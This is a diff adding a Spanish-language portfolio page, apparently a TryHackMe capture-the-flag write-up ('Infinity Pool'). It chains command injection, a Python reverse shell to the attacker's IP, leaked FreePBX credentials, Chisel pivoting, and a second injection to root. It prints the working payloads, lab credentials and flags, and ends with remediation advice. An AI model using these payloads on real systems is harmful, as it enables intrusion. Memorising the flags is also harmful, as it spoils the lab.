@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Infinity Pool — de Command Injection a root vía una API interna · Portfolio</title>
+<meta name="post:titulo" content="Infinity Pool — de Command Injection a root vía una API interna">
+<meta name="post:fecha" content="2026-08-11">
+<meta name="post:resumen" content="Un checker de conectividad mal validado permite command injection y una shell como web; la enumeración interna destapa una API de Watchtower sin autenticación que filtra credenciales de FreePBX, con las que se recupera una Automation Key reutilizada contra un servicio de automatización que corre como root y que resulta vulnerable al mismo fallo de inyección.">
+<meta name="post:tags" content="Command Injection, API interna, Pivoting, Chisel">
+<meta name="post:plataforma" content="TryHackMe">
+<meta name="post:dificultad" content="Media">
+<meta name="post:os" content="Linux">
+<meta name="description" content="Writeup de Salvador Navarro.">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, noai, noimageai">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='12' fill='%23050b17'/%3E%3Ctext x='32' y='47' font-size='44' font-family='monospace' font-weight='bold' text-anchor='middle' fill='%237a8f3a'%3ES%3C/text%3E%3C/svg%3E">
+</head>
+<body>
+
+<header>
+  <a class="logo" href="../index.html">PortFolio</a>
+  <nav>
+    <a href="../index.html">Inicio</a>
+    <div class="dd">
+      <a href="#" class="dd-t">Categorías ▾</a>
+      <div class="dd-m">
+        <a href="../index.html?tipo=Reto">Retos</a>
+        <a href="../index.html?tipo=Proyecto">Proyectos</a>
+        <a href="../index.html?tipo=Estudio">Estudios</a>
+      </div>
+    </div>
+    <a href="../sobremi/sobremi.html">Sobre mí</a>
+  </nav>
+</header>
+
+<main class="reto">
+  <a class="volver" href="../index.html#posts">← Volver a los posts</a>
+
+  <h1>Infinity Pool — de Command Injection a root vía una API interna</h1>
+  <div class="ficha">
+    <span><strong>Fecha:</strong> 11 ago 2026</span>
+    <span><strong>Dificultad:</strong> Media</span>
+    <span><strong>Categoría:</strong> Command Injection / Pivoting</span>
+    <span><strong>Sistema:</strong> Linux (tryhackme-2404)</span>
+    <span><strong>Plataforma:</strong> TryHackMe</span>
+  </div>
+
+  <h2>Resumen</h2>
+  <p>La máquina se resolvió mediante una cadena de vulnerabilidades que comenzó con una inyección de comandos en
+  una funcionalidad interna de comprobación de conectividad, lo que permitió obtener ejecución remota de comandos
+  como el usuario <code>web</code>. La enumeración posterior de servicios internos reveló una API de Watchtower
+  que filtraba credenciales de FreePBX sin ningún tipo de restricción de acceso. Dichas credenciales permitieron
+  entrar al portal UCP y recuperar una Automation Key, utilizada después contra un servicio interno de
+  automatización que se ejecutaba como <code>root</code> — y que resultó ser vulnerable al mismo tipo de fallo
+  que había abierto la puerta de entrada.</p>
+  <p class="respuesta"><b>User flag:</b> <code>THM{n0_v1s1bl3_3dg3}</code> ·
+  <b>Root flag:</b> <code>THM{tr4c3d_t0_th3_h0r1z0n}</code></p>
+
+  <h2>Artefactos y herramientas</h2>
+  <ul>
+    <li><code>nmap</code> / <code>gobuster</code> — reconocimiento de puertos y rutas</li>
+    <li>Shell reversa en Python — RCE inicial vía command injection</li>
+    <li>Chisel — pivoting de un servicio interno en <code>localhost:9000</code> hacia Kali</li>
+    <li><code>curl</code> — interacción manual con las APIs internas (Watchtower y Automation Service)</li>
+  </ul>
+
+  <h2>Análisis</h2>
+
+  <h3>1. Reconocimiento inicial</h3>
+  <div class="pregunta"><b>Objetivo:</b> identificar la superficie de ataque expuesta.</div>
+  <p>El escaneo de puertos únicamente devolvió el servicio HTTP estándar expuesto:</p>
+  <pre><code>80/tcp open http</code></pre>
+  <p>Superficie de ataque mínima a nivel de red: toda la enumeración posterior tuvo que apoyarse en el puerto 80.
+  El fuzzing de rutas sobre el servicio web sacó a la luz una funcionalidad interna no listada en ningún menú
+  visible:</p>
+  <pre><code>/internal/netcheck</code></pre>
+  <p>Este endpoint acabaría siendo el punto de entrada inicial a la máquina.</p>
+
+  <h3>2. Explotación inicial: Command Injection</h3>
+  <div class="pregunta"><b>Objetivo:</b> conseguir ejecución de comandos a partir del checker de conectividad.</div>
+  <p>El endpoint <code>/internal/netcheck</code> aceptaba un parámetro <code>host</code> que se pasaba, sin
+  validar, a un comando del sistema. Esto permitió inyectar y ejecutar comandos arbitrarios en el servidor.</p>
+  <pre><code># Listener en Kali
+nc -lvnp 4444</code></pre>
+  <pre><code># Payload de inyección
+curl -X POST -d "host=127.0.0.1; python3 -c 'import socket,os,pty;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((\"192.168.142.180\",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn(\"/bin/bash\")'" \
+http://10.112.135.22/internal/netcheck</code></pre>
+  <p class="respuesta"><b>Resultado:</b> shell reversa confirmando ejecución de comandos como <code>web@tryhackme-2404</code>.</p>
+
+  <h3>3. Enumeración interna</h3>
+  <div class="pregunta"><b>Objetivo:</b> descubrir servicios internos no accesibles desde el exterior.</div>
+  <p>Con acceso al sistema, la revisión de procesos y sockets locales reveló varios servicios internos
+  escuchando únicamente en <code>127.0.0.1</code>, invisibles desde el exterior:</p>
+  <table>
+    <tr><th>Dirección</th><th>Servicio</th></tr>
+    <tr><td>127.0.0.1:3000</td><td>watchtower</td></tr>
+    <tr><td>127.0.0.1:8080</td><td>FreePBX</td></tr>
+    <tr><td>127.0.0.1:8088</td><td>Asterisk HTTP</td></tr>
+    <tr><td>127.0.0.1:8089</td><td>Asterisk HTTPS</td></tr>
+    <tr><td>127.0.0.1:9000</td><td>automation</td></tr>
+    <tr><td>127.0.0.1:5038</td><td>AMI</td></tr>
+  </table>
+  <p class="respuesta"><b>User flag:</b> <code>THM{n0_v1s1bl3_3dg3}</code> — ya accesible en esta fase.</p>
+
+  <h3>4. Watchtower: la API que hablaba de más</h3>
+  <div class="pregunta"><b>Objetivo:</b> explotar la falta de autenticación de la API interna de Watchtower.</div>
+  <p>El servicio Watchtower, en el puerto 3000, exponía una API interna sin autenticación.</p>
+  <pre><code>curl http://127.0.0.1:3000/api/health
+curl http://127.0.0.1:3000/api/config</code></pre>
+  <p>Respuesta del servidor:</p>
+  <pre><code>{
+  "automation_endpoint":"http://127.0.0.1:9000",
+  "telephony_user":"FreePBXUCPTemplateCreator",
+  "telephony_pass":"St4yN0t1c3d_2026",
+  "telephony_portal":"http://127.0.0.1:8080/ucp"
+}</code></pre>
+  <p>El propio endpoint de configuración devolvía credenciales de FreePBX en texto plano — un fallo de
+  exposición de información que se convirtió en el siguiente eslabón de la cadena.</p>
+
+  <h3>5. Acceso a FreePBX / UCP</h3>
+  <div class="pregunta"><b>Objetivo:</b> usar las credenciales filtradas para entrar al portal de usuario.</div>
+  <pre><code>http://127.0.0.1:8080/ucp
+
+Usuario:  FreePBXUCPTemplateCreator
+Password: St4yN0t1c3d_2026</code></pre>
+  <p>Ya autenticados en el UCP, se localizó una <strong>Automation Key</strong> reservada para integraciones
+  automatizadas del sistema:</p>
+  <pre><code>cc_auto_7b3f9a1c4e0d2f6a</code></pre>
+  <p>Esta clave estaba directamente asociada al servicio interno de automatización detectado antes en la
+  enumeración de puertos (<code>http://127.0.0.1:9000</code>).</p>
+
+  <h3>6. Pivoting con Chisel</h3>
+  <div class="pregunta"><b>Objetivo:</b> alcanzar el servicio de automatización, limitado a localhost en la víctima.</div>
+  <p>Como el servicio de automatización solo escuchaba en <code>localhost</code>, fue necesario tunelizar el
+  puerto 9000 hacia Kali para poder interactuar con él cómodamente.</p>
+  <pre><code># Kali (servidor)
+./chisel server --reverse -p 9999
+
+# Víctima (cliente)
+./chisel client 192.168.142.180:9999 \
+  R:9000:127.0.0.1:9000</code></pre>
+  <p>Con el túnel establecido, el servicio interno quedó accesible localmente desde Kali como si corriera en la
+  propia máquina atacante.</p>
+
+  <h3>7. Automation Service: ejecución como root</h3>
+  <div class="pregunta"><b>Objetivo:</b> entender qué expone el servicio de automatización y cómo autenticarse.</div>
+  <pre><code>curl http://127.0.0.1:9000/health</code></pre>
+  <pre><code>{
+  "service":"automation",
+  "status":"ok",
+  "runs_as":"root",
+  "endpoints":{
+    "GET /health":"service status",
+    "POST /jobs/export":{
+      "auth":"Authorization: Bearer <automation key>",
+      "body":{"report":"<report name>"}
+    }
+  }
+}</code></pre>
+  <p>Esta única respuesta reveló, de golpe, todo lo necesario para la escalada final: el servicio se ejecutaba
+  como <code>root</code>, existía un endpoint privilegiado de exportación (<code>POST /jobs/export</code>), y la
+  autenticación se realizaba mediante un simple token Bearer — precisamente la Automation Key recuperada del UCP.</p>
+
+  <h3>8. Escalada de privilegios: Command Injection (otra vez) como root</h3>
+  <div class="pregunta"><b>Objetivo:</b> conseguir ejecución como root a través del endpoint de exportación.</div>
+  <p>El parámetro <code>report</code> del endpoint de exportación terminaba siendo concatenado en un comando del
+  sistema basado en <code>tar</code>, sin sanitizar — el mismo patrón de inyección que ya había funcionado en
+  <code>/internal/netcheck</code>, esta vez con permisos de <code>root</code>.</p>
+  <pre><code>curl -X POST "http://127.0.0.1:9000/jobs/export" \
+  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
+  -H "Content-Type: application/json" \
+  -d '{"report":"flagita.tgz/var/automation/data ; cat /root/root.txt "}'</code></pre>
+  <p>Respuesta del servicio:</p>
+  <pre><code>{"command":"tar czf /var/automation/exports/flagita.tgz/var/automation/data ; cat /root/root.txt .tgz /var/automation/data 2>&amp;1","output":"THM{tr4c3d_t0_th3_h0r1z0n}\ncat: .tgz: No such file or directory\ncat: /var/automation/data: Is a directory\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"}</code></pre>
+  <p class="respuesta"><b>Root flag:</b> <code>THM{tr4c3d_t0_th3_h0r1z0n}</code></p>
+
+  <h2>Cadena de ataque (kill chain)</h2>
+  <table>
+    <tr><th>#</th><th>Paso</th></tr>
+    <tr><td>1</td><td>Nmap → puerto 80 expuesto</td></tr>
+    <tr><td>2</td><td>Gobuster → descubrimiento de /internal/netcheck</td></tr>
+    <tr><td>3</td><td>Command injection en el parámetro host</td></tr>
+    <tr><td>4</td><td>Reverse shell → acceso como web</td></tr>
+    <tr><td>5</td><td>Watchtower /api/config filtra credenciales de FreePBX</td></tr>
+    <tr><td>6</td><td>Acceso al UCP con las credenciales filtradas</td></tr>
+    <tr><td>7</td><td>Recuperación de la Automation Key en el UCP</td></tr>
+    <tr><td>8</td><td>Pivoting con Chisel hacia el puerto 9000 (automation, corre como root)</td></tr>
+    <tr><td>9</td><td>Automation API: endpoint privilegiado autenticado por Bearer token</td></tr>
+    <tr><td>10</td><td>Command injection en /jobs/export → root.txt</td></tr>
+  </table>
+
+  <h2>Conclusiones</h2>
+  <p>La máquina repite, a dos niveles distintos de privilegio, el mismo fallo de fondo: un parámetro controlado
+  por el usuario que se concatena directamente en un comando del sistema sin sanitizar. A eso se suma una API
+  interna sin autenticación que filtra credenciales en texto plano, confiando únicamente en que
+  <code>127.0.0.1</code> es "zona segura" — una suposición que deja de ser cierta en cuanto el atacante ya tiene
+  ejecución de comandos en la máquina. Las medidas clave de remediación serían: nunca construir comandos de
+  sistema a partir de entrada de usuario (usar APIs nativas del lenguaje o listas blancas estrictas en su
+  lugar), no exponer configuración ni credenciales sin autenticación aunque el servicio esté limitado a
+  localhost, y aplicar el mismo rigor de validación a los servicios internos que a los expuestos públicamente,
+  ya que cualquier RCE inicial los convierte en parte de la superficie de ataque real.</p>
+</main>
+
+<footer>© <span id="year"></span> Salvador Navarro · Portfolio · Writeups · Proyectos</footer>
+<script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+</html>
